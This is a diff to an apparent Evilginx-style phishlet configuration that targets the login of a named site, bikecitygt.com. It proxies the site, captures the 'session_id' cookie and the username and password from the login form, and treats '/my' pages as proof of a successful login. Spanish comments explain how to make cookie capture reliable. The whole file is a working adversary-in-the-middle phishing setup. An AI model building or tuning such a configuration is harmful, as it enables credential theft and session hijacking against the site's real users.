@@ -6,10 +6,10 @@ redirect_url: 'https://www.bikecitygt.com/my'
 proxy_hosts:
 proxy_hosts:
   # Pagina principal
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'bikecitygt.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'bikecitygt.com', session: true, is_landing: true, auto_filter: true}
 auth_tokens:
-  - domain: '.bikecitygt.com'
-    keys: ['session_id']
+  - domain: 'www.bikecitygt.com'  ### Si o si el dominio del que vas a capturar la cookie
+    keys: ['session_id:always'] ### Always para no ignorar la cookie si no tiene expiracion
     type: 'cookie'
 credentials:
   username:
@@ -20,8 +20,9 @@ credentials:
     key: 'password'
     search: '(.*)'
     type: 'post'
-auth_urls:
-  - '/my'
+auth_urls: #Cuando acceda a estas urls es porque ya pudo entrar al perfil
+  - '/my'  
+  - '/my/*'
 login:
   domain: 'www.bikecitygt.com'
   path: '/web/login'
